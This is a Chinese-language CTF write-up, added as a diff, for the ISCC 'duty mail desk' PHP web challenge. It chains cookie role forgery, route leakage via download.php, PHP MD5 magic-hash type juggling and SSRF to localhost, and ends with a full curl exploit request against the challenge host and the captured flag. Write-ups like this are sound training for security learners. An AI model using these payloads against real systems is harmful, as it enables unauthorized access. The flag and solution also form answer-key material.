@@ -1,0 +1,91 @@
+========================================
+  ISCC 值班邮件台 — CTF Web Writeup
+========================================
+
+Flag: ISCC{ACxmCnWgL3C7LqWImKfgtK6h}
+
+Target: http://39.105.213.28:49103/
+
+----------------------------------------
+  一、题目概述
+----------------------------------------
+
+"值班邮件台"是一个 PHP Web 邮件系统，内含管理预览面板。
+目标是访问内部接口 /internal/report?view=flag&slot=last 获取 flag。
+
+----------------------------------------
+  二、漏洞链（4 个漏洞）
+----------------------------------------
+
+漏洞 1：Cookie 伪造（身份绕过）
+  - 应用使用两个 Cookie 标识用户身份：mail_user 和 mail_role
+  - 无服务端签名或校验，直接篡改 mail_role=admin 即可获得管理员权限
+  - Payload:
+      Cookie: mail_user=admin; mail_role=admin
+
+漏洞 2：信息泄露
+  - 三封内部邮件泄露了关键线索：
+    · 邮件 m1：登录态沿用浏览器侧旧标记，暗示 Cookie 可伪造
+    · 邮件 m2：预览面板仅允许本机地址（SSRF 前提）
+    · 邮件 m3："先做摘要再比对，两份输入至少得看起来不是同一串"（哈希碰撞）
+  - download.php 泄露联调文件：
+    · preview-readme.txt → 引用 route-index.txt
+    · route-index.txt → 泄露内部路由：
+        health -> /internal/health
+        mailq  -> /internal/queue
+        final  -> /internal/report?view=flag&slot=last
+
+漏洞 3：MD5 类型混淆（PHP 松散比较）
+  - admin.php 要求提交两个不同的 token，且 hash(token_a) == hash(token_b)
+  - PHP 的 == 运算符会将 "0e" 开头且后续全为数字的字符串解析为科学计数法 0
+  - 已知碰撞对：
+      token_a = QNKCDZO
+        md5 = 0e830400451993494058024219903391
+      token_b = s878926199a
+        md5 = 0e545993274517709034328855841020
+  - PHP 判断：0e830400... == 0e545993... → 0 == 0 → true
+
+漏洞 4：SSRF（服务端请求伪造）
+  - 管理面板的"预览"功能会让服务端去请求 target_url
+  - 仅校验是否为本机地址，可直接指定 127.0.0.1
+  - 通过 SSRF 访问内部接口获取 flag
+
+----------------------------------------
+  三、利用步骤
+----------------------------------------
+
+Step 1: 篡改 Cookie 获得管理员权限
+  Cookie: mail_user=admin; mail_role=admin
+
+Step 2: 访问 admin.php 确认进入后台预览面板
+
+Step 3: 下载 route-index.txt 获取 flag 路由
+  GET /download.php?file=files/notes/route-index.txt
+
+Step 4: 提交 MD5 类型混淆碰撞对 + SSRF 目标
+  POST /admin.php
+  参数：
+    token_a   = QNKCDZO
+    token_b   = s878926199a
+    target_url = http://127.0.0.1/internal/report?view=flag&slot=last
+
+Step 5: 响应中获取 flag
+
+----------------------------------------
+  四、最终 Payload
+----------------------------------------
+
+完整请求：
+
+  curl -s -b "mail_user=admin;mail_role=admin" \
+    -X POST \
+    --data-urlencode "token_a=QNKCDZO" \
+    --data-urlencode "token_b=s878926199a" \
+    --data-urlencode "target_url=http://127.0.0.1/internal/report?view=flag&slot=last" \
+    "http://39.105.213.28:49103/admin.php"
+
+----------------------------------------
+  五、Flag
+----------------------------------------
+
+  ISCC{ACxmCnWgL3C7LqWImKfgtK6h}
